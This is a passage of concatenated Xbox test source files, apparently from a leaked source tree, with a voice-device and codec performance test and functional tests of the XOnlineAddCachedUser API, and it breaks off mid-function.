    Log_va(hLog, FALSE, "%u,", (NULL == dwNumEncoderFailures) ? 0 : *dwNumEncoderFailures);
    Log_va(hLog, FALSE, "%u,", (NULL == dwNumDecoderFailures) ? 0 : *dwNumDecoderFailures);
    Log_va(hLog, FALSE, "%u,", (NULL == dwNumQueueFailures) ? 0 : *dwNumQueueFailures);

    Log_va(hLog, FALSE, "%.3f,", (NULL == dwNumMicrophoneFailures) ? 0 : (DOUBLE) *dwNumMicrophoneFailures / (DOUBLE) dwAverage);
    Log_va(hLog, FALSE, "%.3f,", (NULL == dwNumHeadphoneFailures) ? 0 : (DOUBLE) *dwNumHeadphoneFailures / (DOUBLE) dwAverage);
    Log_va(hLog, FALSE, "%.3f,", (NULL == dwNumEncoderFailures) ? 0 : (DOUBLE) *dwNumEncoderFailures / (DOUBLE) dwAverage);
    Log_va(hLog, FALSE, "%.3f,", (NULL == dwNumDecoderFailures) ? 0 : (DOUBLE) *dwNumDecoderFailures / (DOUBLE) dwAverage);
    Log_va(hLog, FALSE, "%.3f\r\n", (NULL == dwNumQueueFailures) ? 0 : (DOUBLE) *dwNumQueueFailures / (DOUBLE) dwAverage);
}



VOID
LogStatsFailures(
    IN  HANDLE  hLog,
    IN  DWORD   *dwNumMicrophoneFailures,
    IN  DWORD   *dwNumHeadphoneFailures,
    IN  DWORD   *dwNumEncoderFailures,
    IN  DWORD   *dwNumDecoderFailures,
    IN  DWORD   *dwNumQueueFailures,
    IN  DWORD   dwAverage
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Logs the stats failures to the log file

Arguments:

  hLog - Handle to the log object
  dwNumMicrophoneFailures - Microphone creation failures
  dwNumHeadphoneFailures - Headphone creation failures
  dwNumEncoderFailures - Encoder creation failures
  dwNumDecoderFailures - Decoder creation failures
  dwNumQueueFailures - Queue creation failures
  dwAverage - Number to average stats

Return Value:

  None

------------------------------------------------------------------------------*/
{
    if (0 == dwAverage) {
        dwAverage = 1;
    }

    // Write the banner to the log file
    Log_va(hLog, TRUE, "**********\r\nFailures\r\n**********\r\n");

    // Log the stats
    Log_va(hLog, TRUE, "Total\r\n");
    if (NULL != dwNumMicrophoneFailures) {
        Log_va(hLog, TRUE, "    Microphone:                 %14u\r\n", *dwNumMicrophoneFailures);
    }
    if (NULL != dwNumHeadphoneFailures) {
        Log_va(hLog, TRUE, "    Headphone:                  %14u\r\n", *dwNumHeadphoneFailures);
    }
    if (NULL != dwNumEncoderFailures) {
        Log_va(hLog, TRUE, "    Encoder:                    %14u\r\n", *dwNumEncoderFailures);
    }
    if (NULL != dwNumDecoderFailures) {
        Log_va(hLog, TRUE, "    Decoder:                    %14u\r\n", *dwNumDecoderFailures);
    }
    if (NULL != dwNumQueueFailures) {
        Log_va(hLog, TRUE, "    Queue:                      %14u\r\n", *dwNumQueueFailures);
    }

    Log_va(hLog, TRUE, "Average\r\n");
    if (NULL != dwNumMicrophoneFailures) {
        Log_va(hLog, TRUE, "    Microphone:                 %14.3f\r\n", (DOUBLE) *dwNumMicrophoneFailures / (DOUBLE) dwAverage);
    }
    if (NULL != dwNumHeadphoneFailures) {
        Log_va(hLog, TRUE, "    Headphone:                  %14.3f\r\n", (DOUBLE) *dwNumHeadphoneFailures / (DOUBLE) dwAverage);
    }
    if (NULL != dwNumEncoderFailures) {
        Log_va(hLog, TRUE, "    Encoder:                    %14.3f\r\n", (DOUBLE) *dwNumEncoderFailures / (DOUBLE) dwAverage);
    }
    if (NULL != dwNumDecoderFailures) {
        Log_va(hLog, TRUE, "    Decoder:                    %14.3f\r\n", (DOUBLE) *dwNumDecoderFailures / (DOUBLE) dwAverage);
    }
    if (NULL != dwNumQueueFailures) {
        Log_va(hLog, TRUE, "    Queue:                      %14.3f\r\n", (DOUBLE) *dwNumQueueFailures / (DOUBLE) dwAverage);
    }

    // End the section
    Log_va(hLog, TRUE, "**********\r\n\r\n");
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\xvoice\perf\precomp.h ===
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Copyright (c) Microsoft Corporation

Module Name:

    precomp.h

Abstract:

    Pre-compiled header file

Author:

    Steven Kehrli (steveke) 23-Oct-2001

Environment:

    XBox

Revision History:

------------------------------------------------------------------------------*/

#include <nt.h>
#include <ntrtl.h>
#include <nturtl.h>
#include <xtl.h>
#include <stdio.h>
#include <ntos.h>
#include <xvoice.h>

#include <xmem.h>

#include "util.h"
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\sources.inc ===
TEST_INCLUDES=$(BASEDIR)\private\test\inc
TEST_ONLINE_INCLUDES=$(BASEDIR)\private\test\online\client\inc
TEST_ONLINE_LIBS=$(BASEDIR)\private\test\online\client\lib\i386

INCLUDES=\
	$(INCLUDES); \
	$(TEST_INCLUDES); \
	$(TEST_ONLINE_INCLUDES);
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineAddCachedUser\XOnlineAddCachedUser.h ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineAddCachedUser.h
 *  Content:    XOnlineAddCachedUser utility interface
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/28/01    danrose Created to test Xbox XOnlineAddCachedUser
 *
 ****************************************************************************/

#pragma once

#include <xtl.h>
#include <xdbg.h>
#include <xtestlib.h>
#include <xlog.h>
#include <macros.h>
#include <OnlineAccounts.h>
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\online\client\auth\XOnlineAddCachedUser\XOnlineAddCachedUser.cpp ===
/***************************************************************************
 *
 *  Copyright (C) 2000 Microsoft Corporation.  All Rights Reserved.
 *
 *  File:       XOnlineAddCachedUser.cpp
 *  Content:    XOnlineAddCachedUser tests
 *  History:
 *   Date       By       Reason
 *   ====       ==       ======
 *  10/28/01    danrose Created to test Xbox XOnlineAddCachedUser
 *  01/05/02    davidhef Fixed bug in comparison of user data
 *  01/10/02    davidhef Converted to new accounts tool.  Rewrote tests
 *                          to account for API changes.
 *
 ****************************************************************************/

#include "XOnlineAddCachedUser.h"
#include <XOnlineAuthUtil.h>
#include <CXLiveConnectionManager.h>

using XLive::CXLiveConnectionManager;


/****************************************************************************
 *
 * The Global Logging Handle
 *
 ****************************************************************************/

extern HANDLE g_hLog;

/****************************************************************************
 *
 * The Global online param check flag
 *
 ****************************************************************************/

extern BOOL g_ParamCheckReturnsError;

/****************************************************************************
 *
 *  XOnlineAddCachedUser_BASIC_TEST
 *
 *	Description:
 *		Add valid users to HD until it can take no more.
 *
 *	System State:
 *		User exists on drive: FALSE
 *		User on drive valid: N/A
 *		Number of users on drive: 0
 *
 *	Verify: 
 *		Return value is S_OK
 *		Correct number of users exist on HD
 *		User on drive valid
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineAddCachedUser_BASIC_TEST( void )
{
    HRESULT             hr              = S_OK;
    DWORD				dwNumUsers		= 0;
    
    XONLINEP_USER aIniUsers[XONLINE_MAX_STORED_ONLINE_USERS];
    XONLINE_USER aVerifyUsers[XONLINE_MAX_STORED_ONLINE_USERS];
    
    static DWORD dwServices[] = {
            XONLINE_MATCHMAKING_SERVICE,
            XONLINE_BILLING_OFFERING_SERVICE
    };
    DWORD cServices = sizeof(dwServices) / sizeof(dwServices[0]);

    // zero out the users
    ZeroMemory( aIniUsers, sizeof( aIniUsers ) );
    
    // zero out the verify users
    ZeroMemory( aVerifyUsers, sizeof( aVerifyUsers ) );
    
    // Generate a list of users in memory.
    CHECKRUN( COnlineAccounts::Instance()->PopulateUserAccountsHD( aIniUsers, XONLINE_MAX_HD_ONLINE_USERS, true ) );
    
    // Logon with 0 users just to create a connection.
    CHECKRUN(CXLiveConnectionManager::Instance().SelectServices(&dwServices[0], cServices));
    CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection((PXONLINE_USER) &aIniUsers[0]));

    CHECKRUN( DeleteAllUsersFromHD() );

    // Add users until we reach the max allowed.
    for ( DWORD i = 0; i < XONLINE_MAX_HD_ONLINE_USERS && SUCCEEDED( hr ); i++ )
    {
        // add 1 user to this drive
        CHECKRUN( _XOnlineAddUserToHD( (PXONLINE_USER)( aIniUsers + i ) ) );
        
        // Get the users on the drive
        CHECKRUN( XOnlineGetUsers( aVerifyUsers, &dwNumUsers ) );
        
        // check to make sure there are the correct number of users
        if ( SUCCEEDED( hr ) )
        {
            hr = ((i + 1) == dwNumUsers - CountMUAccounts(aVerifyUsers)) ? S_OK : E_FAIL;
        }
    }

    CHECKRUN(CXLiveConnectionManager::Instance().Logoff());

    return hr;
}


/****************************************************************************
 *
 *  XOnlineAddCachedUser_OVERFLOW_TEST
 *
 *	Description:
 *		Go through each mountable drive (mu and hard disk), 
 *		and add a cached user to that drive when it is full
 *
 *	Input: 
 *		chDrive: 'a' thru 'z' 
 *		pUser: valid user
 *
 *	System State:
 *		User exists on drive: FALSE
 *		User on drive valid: N/A
 *		Number of users on drive: MAX_STORED_ONLINE_USERS	
 *		MU at drive exists: TRUE
 *
 *	Verify: 
 *		Return value is not S_OK
 *		Only XONLINE_MAX_STORED_ONLINE_USERS on drive
 *		Users on drive are valid
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineAddCachedUser_OVERFLOW_TEST( void )
{
    HRESULT             hr              = S_OK;
    
    DWORD				dwNumUsers		= 0;
    
    XONLINE_USER aIniUsers[XONLINE_MAX_STORED_ONLINE_USERS];
    XONLINE_USER aVerifyUsers[XONLINE_MAX_STORED_ONLINE_USERS];
    
    XONLINEP_USER user;
    
    static DWORD dwServices[] = {
            XONLINE_MATCHMAKING_SERVICE,
            XONLINE_BILLING_OFFERING_SERVICE
    };
    DWORD cServices = sizeof(dwServices) / sizeof(dwServices[0]);

    ZeroMemory( &user, sizeof( XONLINE_USER ) );
    
    // fill in the user with some information
    user.xuid.qwUserID = 0x0123456789ABCDEF;
    strcpy( user.name, "dan" );
    strcpy( user.kingdom, "xbox" );
    strcpy( user.domain, "xboxtest.com" );
    strcpy( user.realm, "passport.net" );
    
    for ( BYTE i = 0; i < XONLINE_KEY_LENGTH; i++ )
    {
        user.key[i] = i;
    }
    
    ZeroMemory( aIniUsers, sizeof( aIniUsers ) );
    ZeroMemory( aVerifyUsers, sizeof( aVerifyUsers ) );
    
    // remove all users on the drive, put 8 users on it
    CHECKRUN( COnlineAccounts::Instance()->PopulateUserAccountsHD( (PXONLINEP_USER) aIniUsers, XONLINE_MAX_HD_ONLINE_USERS, true ) );
    
    // Logon with 0 users just to create a connection.
    CHECKRUN(CXLiveConnectionManager::Instance().SelectServices(&dwServices[0], cServices));
    CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection((PXONLINE_USER) &aIniUsers[0]));

    // add 1 user to this drive
    CHECKRUN( SUCCEED_ON_FAIL( _XOnlineAddUserToHD( (PXONLINE_USER) &user ), E_OUTOFMEMORY ) );
    
    // Get the users on the drive
    CHECKRUN( XOnlineGetUsers( aVerifyUsers, &dwNumUsers ) );

    if ( SUCCEEDED( hr ) )
    {
        hr = (XONLINE_MAX_HD_ONLINE_USERS == dwNumUsers - CountMUAccounts(aVerifyUsers)) ? S_OK : E_FAIL;
    }
    
    CHECKRUN(CXLiveConnectionManager::Instance().Logoff());

    return hr;
}

/****************************************************************************
 *
 *  XOnlineAddCachedUser_NULL_USER
 *
 *	Description:
 *		Make sure API fails with NULL pUser
 *
 *	Input: 
 *		chDrive: XONLINE_LOCAL_HARD_DRIVE, 
 *		pUser: NULL
 *
 *	System State:
 *		User exists on drive: N/A
 *		User on drive valid: N/A
 *		Number of users on drive: N/A
 *		MU at drive exists: N/A
 *
 *	Verify: 
 *		Return value is not S_OK
 *
 *  Returns:  
 *      S_OK on success
 *      E_XX on failure
 *
 ****************************************************************************/

HRESULT XOnlineAddCachedUser_NULL_USER( void )
{
    HRESULT             hr              = S_OK;
    XONLINE_USER aIniUsers[XONLINE_MAX_STORED_ONLINE_USERS];
    static DWORD dwServices[] = {
            XONLINE_MATCHMAKING_SERVICE,
            XONLINE_BILLING_OFFERING_SERVICE
    };
    DWORD cServices = sizeof(dwServices) / sizeof(dwServices[0]);

    ZeroMemory(aIniUsers, sizeof(aIniUsers));
	
	//
	// set the param check flag
	//

	g_ParamCheckReturnsError = TRUE;

    // Logon with 0 users just to create a connection.
    CHECKRUN(CXLiveConnectionManager::Instance().SelectServices(&dwServices[0], cServices));
    CHECKRUN(CXLiveConnectionManager::Instance().LogonAndWaitForConnection((PXONLINE_USER) &aIniUsers[0]));

	//
	// call AddCachedUser
	//

	CHECKRUN( SUCCEED_ON_FAIL( _XOnlineAddUserToHD( NULL ), E_INVALIDARG ) );

	//
	// reset the param check flag
	//

	g_ParamCheckReturnsError = FALSE;

    CHECKRUN(CXLiveConnectionManager::Instance().Logoff());
    
    return hr;
}


/****************************************************************************
 *
 *  XOnlineAddCachedUser_StartTest
 *
 *  Description:
 *      The Harness Entry into the XOnlineAddCachedUser tests
 *
 *  Arguments:
 *      LogHandle - a handle to a logging object
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineAddCachedUser_StartTest( HANDLE LogHandle )
{
    HRESULT             hr              = S_OK;

    //
    // the following tests will Assert (by design) in debug builds
    // to turn these tests on (they are off by default) define
    // CODE_COVERAGE when this file is compiled
    //

#ifdef CODE_COVERAGE

#endif // CODE_COVERAGE

    //
    // Test XOnlineAddCachedUser with valid drives and valid users
    //

    CHECKRUN( StartNetwork() );
    
    SETLOG( LogHandle, "danrose", "Online", "XOnlineAddCachedUser", "BASIC_TEST" );
    EXECUTE( XOnlineAddCachedUser_BASIC_TEST() );
    
    if (!BVTMode())
    {
        //
        // Test XOnlineAddCachedUser when the drive is full
        //
        
        SETLOG( LogHandle, "danrose", "Online", "XOnlineAddCachedUser", "OVERFLOW_TEST" );
        EXECUTE( XOnlineAddCachedUser_OVERFLOW_TEST() );
        
        //
        // Test XOnlineAddCachedUser with a NULL user
        //
        
        SETLOG( LogHandle, "danrose", "Online", "XOnlineAddCachedUser", "NULL_USER" );
        EXECUTE( XOnlineAddCachedUser_NULL_USER() );
    }
    
    CHECKRUN( CloseNetwork() );
}

/****************************************************************************
 *
 *  XOnlineAddCachedUser_EndTest
 *
 *  Description:
 *      The Exit function for the test harness
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *		(void)
 *
 ****************************************************************************/

VOID WINAPI XOnlineAddCachedUser_EndTest( VOID )
{
}

/****************************************************************************
 *
 *  main
 *
 *  Description:
 *      the exe entry point
 *
 *  Arguments:
 *      (void)
 *
 *  Returns:  
 *      (void)
 *
 ****************************************************************************/

#ifdef NOLOGGING
void __cdecl main( void )
{
    XOnlineAddCachedUser_StartTest( NULL );
    XOnlineAddCachedUser_EndTest();
}
#endif // NOLOGGING

/****************************************************************************
 *
 * Export Function Pointers for StartTest and EndTest
 *
 ****************************************************************************/

#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( XOnlineAddCachedUser )
#pragma data_seg()

BEGIN_EXPORT_TABLE( XOnlineAddCachedUser )
    EXPORT_TABLE_ENTRY( "StartTest", XOnlineAddCachedUser_StartTest )
    EXPORT_TABLE_ENTRY( "EndTest", XOnlineAddCachedUser_EndTest )
END_EXPORT_TABLE( XOnlineAddCachedUser )
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\xvoice\perf\main.c ===
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Copyright (c) Microsoft Corporation

Module Name:

  main.c

Abstract:

  This module tests XMO Voice performance

Author:

  Steven Kehrli (steveke) 23-Oct-2001

Environment:

  XBox

Revision History:

------------------------------------------------------------------------------*/

#include "precomp.h"



#define MAX_MICROPHONE       4
#define MAX_HEADPHONE        4
#define MAX_ENCODER          4
#define MAX_DECODER          12
#define MAX_QUEUE            12

#define MAX_PACKETS          10
#define MAX_THRESHOLD        25

#define VOICE_SAMPLING_RATE  8000
#define VOICE_BYTES_PER_MS   (VOICE_SAMPLING_RATE / 1000) * 2



VOID
GetDevices(
    IN OUT DWORD  *dwMicrophoneMask,
    IN OUT DWORD  *dwHeadphoneMask
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Gets all devices

Arguments:

  dwMicrophoneMask - Pointer to the bitmask of microphone devices
  dwHeadphoneMask - Pointer to the bitmask of headphone devices

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // dwInsertions is the device mask of insertions
    DWORD  dwInsertions;
    // dwRemovals is the device mask of removals
    DWORD  dwRemovals;
    // dwCurrentDevice is a counter to enumerate each device
    DWORD  dwCurrentDevice;
    // dwObject is a counter to enumerate device changes
    DWORD  dwObject;



    // Get the microphones
    *dwMicrophoneMask = XGetDevices(XDEVICE_TYPE_VOICE_MICROPHONE);

    // Get the headphones
    *dwHeadphoneMask = XGetDevices(XDEVICE_TYPE_VOICE_HEADPHONE);

    for (dwObject = 0; dwObject < 40 && (((XDEVICE_PORT0_MASK | XDEVICE_PORT1_MASK | XDEVICE_PORT2_MASK | XDEVICE_PORT3_MASK) != *dwMicrophoneMask) || ((XDEVICE_PORT0_MASK | XDEVICE_PORT1_MASK | XDEVICE_PORT2_MASK | XDEVICE_PORT3_MASK) != *dwHeadphoneMask)); dwObject++) {
        Sleep(200);

        if (FALSE == XGetDeviceChanges(XDEVICE_TYPE_VOICE_MICROPHONE, &dwInsertions, &dwRemovals)) {
            dwInsertions = 0;
            dwRemovals = 0;
        }

        for (dwCurrentDevice = 0; dwCurrentDevice < XGetPortCount(); dwCurrentDevice++) {
            // Remove the device if it has been removed
            if ((1 << dwCurrentDevice) & dwRemovals) {
                *dwMicrophoneMask &= ~(1 << dwCurrentDevice);
            }

            // Add the device if it has been inserted
            if ((1 << dwCurrentDevice) & dwInsertions) {
                *dwMicrophoneMask |= (1 << dwCurrentDevice);
            }
        }

        if (FALSE == XGetDeviceChanges(XDEVICE_TYPE_VOICE_HEADPHONE, &dwInsertions, &dwRemovals)) {
            dwInsertions = 0;
            dwRemovals = 0;
        }

        for (dwCurrentDevice = 0; dwCurrentDevice < XGetPortCount(); dwCurrentDevice++) {
            // Remove the device if it has been removed
            if ((1 << dwCurrentDevice) & dwRemovals) {
                *dwHeadphoneMask &= ~(1 << dwCurrentDevice);
            }

            // Add the device if it has been inserted
            if ((1 << dwCurrentDevice) & dwInsertions) {
                *dwHeadphoneMask |= (1 << dwCurrentDevice);
            }
        }
    };
}



BOOL
DeviceInit(
    IN HANDLE  hLog
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Initializes all devices

Arguments:

  hLog - Handle to the log object

Return Value:

  TRUE on success

------------------------------------------------------------------------------*/
{
    // dwMicrophoneMask is the microphone device mask
    DWORD  dwMicrophoneMask;
    // dwHeadphoneMask is the headphone device mask
    DWORD  dwHeadphoneMask;



    Log_va(hLog, TRUE, "**********\r\nDeviceInit\r\n**********\r\n");
    Log_va(hLog, TRUE, "Please ensure four (4) Xbox Communicators are connected.\r\n");
    Log_va(hLog, TRUE, "Enumerating devices...\r\n");

    // Initialize the devices
    XInitDevices(0, NULL);

    // Get the devices
    GetDevices(&dwMicrophoneMask, &dwHeadphoneMask);

    if (0 == (XDEVICE_PORT0_MASK & dwMicrophoneMask)) {
        Log_va(hLog, TRUE, "    Microphone missing in Port 0\r\n");
    }

    if (0 == (XDEVICE_PORT1_MASK & dwMicrophoneMask)) {
        Log_va(hLog, TRUE, "    Microphone missing in Port 1\r\n");
    }

    if (0 == (XDEVICE_PORT2_MASK & dwMicrophoneMask)) {
        Log_va(hLog, TRUE, "    Microphone missing in Port 2\r\n");
    }

    if (0 == (XDEVICE_PORT3_MASK & dwMicrophoneMask)) {
        Log_va(hLog, TRUE, "    Microphone missing in Port 3\r\n");
    }

    if (0 == (XDEVICE_PORT0_MASK & dwHeadphoneMask)) {
        Log_va(hLog, TRUE, "    Headphone missing in Port 0\r\n");
    }

    if (0 == (XDEVICE_PORT1_MASK & dwHeadphoneMask)) {
        Log_va(hLog, TRUE, "    Headphone missing in Port 1\r\n");
    }

    if (0 == (XDEVICE_PORT2_MASK & dwHeadphoneMask)) {
        Log_va(hLog, TRUE, "    Headphone missing in Port 2\r\n");
    }

    if (0 == (XDEVICE_PORT3_MASK & dwHeadphoneMask)) {
        Log_va(hLog, TRUE, "    Headphone missing in Port 3\r\n");
    }

    Log_va(hLog, TRUE, "**********\r\n\r\n");

    return (((XDEVICE_PORT0_MASK | XDEVICE_PORT1_MASK | XDEVICE_PORT2_MASK | XDEVICE_PORT3_MASK) == dwMicrophoneMask) || ((XDEVICE_PORT0_MASK | XDEVICE_PORT1_MASK | XDEVICE_PORT2_MASK | XDEVICE_PORT3_MASK) == dwHeadphoneMask));
}



BOOL
DeviceCreate(
    IN     HANDLE  hLog,
    IN     LPSTR   lpszTestName,
    IN     DWORD   dwTestIteration,
    IN OUT ULONG   *KernelTimeDiff,
    IN OUT ULONG   *InterruptTimeDiff,
    IN OUT ULONG   *DpcTimeDiff,
    IN OUT ULONG   *IdleTimeDiff,
    IN OUT DWORD   *dwNumMicrophoneFailures,
    IN OUT DWORD   *dwNumHeadphoneFailures,
    IN     DWORD   dwNumMicrophones,
    IN     DWORD   dwNumHeadphones
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Creates devices

Arguments:

  hLog - Handle to the log object
  lpszTestName - Pointer to the test name
  dwTestIteration - Test iteration
  KernelTimeDiff - Diff kernel time
  InterruptTimeDiff - Diff interrupt time
  DpcTimeDiff - Diff dpc time
  IdleTimeDiff - Diff idle time
  dwNumMicrophoneFailures - Pointer to the number of microphone creation failures
  dwNumHeadphoneFailures - Pointer to the number of headphone creation failures
  dwNumMicrophones - Number of microphone devices to initialize
  dwNumHeadphones - Number of headphone devices to initialize

Return Value:

  TRUE on success

------------------------------------------------------------------------------*/
{
    // KernelTimeInitial is the initial kernel time
    ULONG          KernelTimeInitial;
    // KernelTimeFinal is the final kernel time
    ULONG          KernelTimeFinal;
    // InterruptTimeInitial is the initial interrupt time
    ULONG          InterruptTimeInitial;
    // InterruptTimeFinal is the final interrupt time
    ULONG          InterruptTimeFinal;
    // DpcTimeInitial is the initial dpc time
    ULONG          DpcTimeInitial;
    // DpcTimeFinal is the final dpc time
    ULONG          DpcTimeFinal;
    // IdleTimeInitial is the initial idle time
    ULONG          IdleTimeInitial;
    // IdleTimeFinal is the final idle time
    ULONG          IdleTimeFinal;

    // wfxFormat is the wave format for the device
    WAVEFORMATEX   wfxFormat;
    // pMicrophoneObject is the array of microphone devices
    XMediaObject   *pMicrophoneObject[MAX_MICROPHONE];
    // pHeadphoneObject is the array of headphone devices
    XMediaObject   *pHeadphoneObject[MAX_HEADPHONE];
    // hMicrophoneResult is the result of the microphone device creation
    HRESULT        hMicrophoneResult[MAX_MICROPHONE];
    // hHeadphoneResult is the result of the headphone device creation
    HRESULT        hHeadphoneResult[MAX_HEADPHONE];
    // dwMicrophoneAttempts is the number of microphone device creation attempts
    DWORD          dwMicrophoneAttempts[MAX_MICROPHONE];
    // dwHeadphoneAttempts is the number of headphone device creation attempts
    DWORD          dwHeadphoneAttempts[MAX_HEADPHONE];
    // dwTotalMicrophoneFailures is the number of total microphone device creation failures
    DWORD          dwTotalMicrophoneFailures = 0;
    // dwTotalHeadphoneFailures is the number of total headphone device creation failures
    DWORD          dwTotalHeadphoneFailures = 0;
    // dwObject is a counter to enumerate each device
    DWORD          dwObject;

    // bPassed is the result of this test
    BOOL           bPassed = TRUE;



    // Set the numbers
    dwNumMicrophones = __min(MAX_MICROPHONE, dwNumMicrophones);
    dwNumHeadphones = __min(MAX_HEADPHONE, dwNumHeadphones);



    // Initialize the variables
    ZeroMemory(pMicrophoneObject, sizeof(pMicrophoneObject));
    ZeroMemory(pHeadphoneObject, sizeof(pHeadphoneObject));



    // Initialize the wave format
    ZeroMemory(&wfxFormat, sizeof(wfxFormat));
    wfxFormat.wFormatTag = WAVE_FORMAT_PCM;
    wfxFormat.nChannels = 1;
    wfxFormat.nSamplesPerSec = VOICE_SAMPLING_RATE;
    wfxFormat.nAvgBytesPerSec = 2 * VOICE_SAMPLING_RATE;
    wfxFormat.nBlockAlign = 2;
    wfxFormat.wBitsPerSample = 16;
    wfxFormat.cbSize = 0;

    // Query the CPU times
    GetCpuTimes(&KernelTimeInitial, &InterruptTimeInitial, &DpcTimeInitial, &IdleTimeInitial);



    // Create the devices

    // Microphone
    for (dwObject = 0; dwObject < dwNumMicrophones; dwObject++) {
        dwMicrophoneAttempts[dwObject] = 0;
        do {
            hMicrophoneResult[dwObject] = XVoiceCreateMediaObject(XDEVICE_TYPE_VOICE_MICROPHONE, dwObject, MAX_PACKETS, &wfxFormat, &pMicrophoneObject[dwObject]);
            dwMicrophoneAttempts[dwObject]++;

            if (FAILED(hMicrophoneResult[dwObject])) {
                Sleep(200);
            }
        } while (FAILED(hMicrophoneResult[dwObject]));
    }

    // Headphone
    for (dwObject = 0; dwObject < dwNumHeadphones; dwObject++) {
        dwHeadphoneAttempts[dwObject] = 0;
        do {
            hHeadphoneResult[dwObject] = XVoiceCreateMediaObject(XDEVICE_TYPE_VOICE_HEADPHONE, dwObject, MAX_PACKETS, &wfxFormat, &pHeadphoneObject[dwObject]);
            dwHeadphoneAttempts[dwObject]++;

            if (FAILED(hHeadphoneResult[dwObject])) {
                Sleep(200);
            }
        } while (FAILED(hHeadphoneResult[dwObject]));
    }



    // Query the CPU times
    GetCpuTimes(&KernelTimeFinal, &InterruptTimeFinal, &DpcTimeFinal, &IdleTimeFinal);



    // Free the devices

    // Microphone
    for (dwObject = 0; dwObject < dwNumMicrophones; dwObject++) {
        dwTotalMicrophoneFailures += dwMicrophoneAttempts[dwObject] - 1;
        *dwNumMicrophoneFailures += dwMicrophoneAttempts[dwObject] - 1;

        // Close the device
        pMicrophoneObject[dwObject]->Release();
    }

    // Headphone
    for (dwObject = 0; dwObject < dwNumHeadphones; dwObject++) {
        dwTotalHeadphoneFailures += dwHeadphoneAttempts[dwObject] - 1;
        *dwNumHeadphoneFailures += dwHeadphoneAttempts[dwObject] - 1;

        // Close the device
        pHeadphoneObject[dwObject]->Release();
    }



    if (TRUE == bPassed) {
        // Log the stats
        LogStats(hLog, lpszTestName, dwTestIteration, KernelTimeInitial, KernelTimeFinal, InterruptTimeInitial, InterruptTimeFinal, DpcTimeInitial, DpcTimeFinal, IdleTimeInitial, IdleTimeFinal, &dwTotalMicrophoneFailures, &dwTotalHeadphoneFailures, NULL, NULL, NULL);
        CalculateAndAddStatsDiff(KernelTimeInitial, KernelTimeFinal, InterruptTimeInitial, InterruptTimeFinal, DpcTimeInitial, DpcTimeFinal, IdleTimeInitial, IdleTimeFinal, KernelTimeDiff, InterruptTimeDiff, DpcTimeDiff, IdleTimeDiff);
    }

    return (TRUE == bPassed);
}



BOOL
CodecCreate(
    IN     HANDLE  hLog,
    IN     LPSTR   lpszTestName,
    IN     DWORD   dwTestIteration,
    IN OUT ULONG   *KernelTimeDiff,
    IN OUT ULONG   *InterruptTimeDiff,
    IN OUT ULONG   *DpcTimeDiff,
    IN OUT ULONG   *IdleTimeDiff,
    IN OUT DWORD   *dwNumEncoderFailures,
    IN OUT DWORD   *dwNumDecoderFailures,
    IN OUT DWORD   *dwNumQueueFailures,
    IN     DWORD   dwNumEncoder,
    IN     DWORD   dwNumDecoder,
    IN     DWORD   dwNumQueue,
    IN     DWORD   dwCodecTag,
    IN     WORD    wMsOfDataPerPacket
)
/*++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Routine Description:

  Creates codecs

Arguments:

  hLog - Handle to the log object
  lpszTestName - Pointer to the test name
  dwTestIteration - Test iteration
  KernelTimeDiff - Diff kernel time
  InterruptTimeDiff - Diff interrupt time
  DpcTimeDiff - Diff dpc time
  IdleTimeDiff - Diff idle time
  dwNumEncoderFailures - Pointer to the number of encoder creation failures
  dwNumDecoderFailures - Pointer to the number of decoder creation failures
  dwNumQueueFailures - Pointer to the number of queue creation failures
  dwCodecTag - Specifies the codec
  dwNumEncoder - Number of encoder objects to create
  dwNumDecoder - Number of decoder objects to create
  dwNumQueue - Number of queue objects to create
  wMsOfDataPerPacket - Milliseconds of voice data per packet

Return Value:

  TRUE on success

------------------------------------------------------------------------------*/
{
    // KernelTimeInitial is the initial kernel time
    ULONG                   KernelTimeInitial;
    // KernelTimeFinal is the final kernel time
    ULONG                   KernelTimeFinal;
    // InterruptTimeInitial is the initial interrupt time
    ULONG                   InterruptTimeInitial;
    // InterruptTimeFinal is the final interrupt time
    ULONG                   InterruptTimeFinal;
    // DpcTimeInitial is the initial dpc time
    ULONG                   DpcTimeInitial;
    // DpcTimeFinal is the final dpc time
    ULONG                   DpcTimeFinal;
    // IdleTimeInitial is the initial idle time
    ULONG                   IdleTimeInitial;
    // IdleTimeFinal is the final idle time
    ULONG                   IdleTimeFinal;

    // wfxFormat is the wave format for the object
    WAVEFORMATEX            wfxFormat;
    // QueueConfig is the queue config for the object
    QUEUE_XMO_CONFIG        QueueConfig;
    // pEncoderObject is the array of encoder objects
    XMediaObject            *pEncoderObject[MAX_ENCODER];
